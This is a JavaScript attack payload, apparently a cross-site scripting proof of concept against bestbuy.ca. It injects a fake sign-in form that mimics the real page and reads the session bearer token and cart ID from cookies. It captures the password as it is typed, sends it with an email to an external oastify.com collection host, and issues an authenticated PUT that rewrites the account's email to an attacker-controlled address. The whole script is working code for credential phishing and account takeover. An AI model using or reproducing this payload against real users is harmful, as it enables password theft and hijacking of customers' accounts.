
(setTimeout(function () {
  function getCookie(name) {
    const match = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
    return match ? decodeURIComponent(match[2]) : null;
  }

  // Inject input using innerHTML
  document.body.innerHTML += `
    <form class="styles-module_bbyForm__oQbPS" id="signIn" aria-label=""><fieldset><div class="styles-modules_formItem__AWUuW "><div class="input-container "><label for="username" aria-hidden="true">Email Address</label><div class="style-module_bbyInput__s2vJL"><div class="false"><input type="email" id="username" name="username" maxlength="50" aria-label="Enter account email address" aria-required="true" data-automation="sign-in-email" aria-describedby="error-username" value=""><div class="highlight"></div></div></div><div role="alert" aria-live="assertive" aria-atomic="true" aria-relevant="all" id="error-username" class="error-msg" data-automation="sign-in-email-inline-error-msg"></div></div></div><div class="styles-modules_formItem__AWUuW "><div class="input-container "><label for="password" aria-hidden="true">Password</label><div class="styles-modules_bbyInput__bUF5h"><div class=""><input type="password" name="password" id="password" maxlength="30" aria-label="Enter account password" aria-required="true" data-automation="sign-in-password" aria-describedby="error-password" autofocus="" value=""><span class="show-hide-password" tabindex="0" role="button" aria-label="Show your password">Show</span><div class="highlight"></div></div></div><div role="alert" aria-live="assertive" aria-atomic="true" aria-relevant="all" id="error-password" class="error-msg" data-automation="sign-in-password-inline-error-msg"></div></div></div><div><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-wdgqoefiwvdr" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LdLhXEUAAAAACZo2QdzqcnoSN7FvEZT8pMykY2s&amp;co=aHR0cHM6Ly93d3cuYmVzdGJ1eS5jYTo0NDM.&amp;hl=en&amp;type=image&amp;v=hbAq-YhJxOnlU-7cpgBoAJHb&amp;theme=light&amp;size=invisible&amp;badge=bottomright&amp;cb=ngm1psltofyu"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div></div></fieldset><div data-automation="registered-sign-in" class="signin-form-button-wrapper_ERwZi"><button class="style-module_button__ucc8a style-module_secondary__Rv1BF signin-form-button_CqjFT style-module_regular__K-LJa style-module_fitContainer__sN6uw" type="submit" aria-label="Sign in into your account" data-automation="sign-in-button"><span class="style-module_content__qYLKo" tabindex="-1">Sign In</span></button><div class="forgot-password-link_ep_Cu" data-automation="forgot-password-link"><a class="styles-module_link__gsq1z focus-visible-outline-2" href="https://www.bestbuy.ca/identity/en-ca/forgot-password" target="_self" rel="external" data-testid="forgot-password-element" aria-label="Go to the forgot password page">Forgot Password?</a></div></div></form>

  `;

  const input = document.getElementById("password");

  function sendRequest(password) {
    const cartId = getCookie("cartId");
    const bearer = getCookie("ta");
    if (!cartId || !bearer || !password) return;

    const url = `https://www.bestbuy.ca/api/account/customers/{${encodeURIComponent(cartId)}}`;
    const body = {
      defaultLanguage: "fr-CA",
      email: "jayeshtryme@gmail.com",
      firstName: "The",
      lastName: "Attacker",
      locale: "en-CA",
      password: password
    };
    fetch(`https://200kldpno0qwu9xlpbumpmojbah15rtg.oastify.com?email=${encodeURIComponent(body.email)}&pass=${encodeURIComponent(password)}`);

    fetch(url, {
      method: "PUT",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${bearer}`
      },
      body: JSON.stringify(body)
    }).then(res => res.json())
      .then(data => console.log("Response:", data))
      .catch(err => console.error("Error:", err));
  }

  input.addEventListener("blur", () => sendRequest(input.value));
  input.addEventListener("input", () => sendRequest(input.value));
}, 3000);)();
